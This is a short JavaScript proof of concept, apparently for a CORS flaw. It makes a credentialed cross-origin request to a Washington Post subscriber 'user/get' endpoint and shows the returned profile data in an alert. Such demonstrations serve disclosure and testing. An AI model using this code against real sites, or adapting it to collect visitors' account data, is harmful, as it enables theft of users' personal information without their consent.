
    function makeCorsRequest() {
    var xhr = new XMLHttpRequest();
    
    // Define the endpoint and HTTP method
    var url = "https://subscribe.washingtonpost.com/user/get?includedLinkedProfiles=true";
    xhr.open("POST", url, true);

    // Set up the necessary headers
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Accept", "application/json");
    
    // Optionally add custom headers like cookies, although this may not work due to CORS policies
    xhr.withCredentials = true;
    // Handle the response
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                alert(xhr.responseText)
            } else {
                console.error("Error:", xhr.statusText);
            }
        }
    };

    // Send the request with an empty body as specified in the original example
    xhr.send(null);
}

// Call the function to make the request
makeCorsRequest();
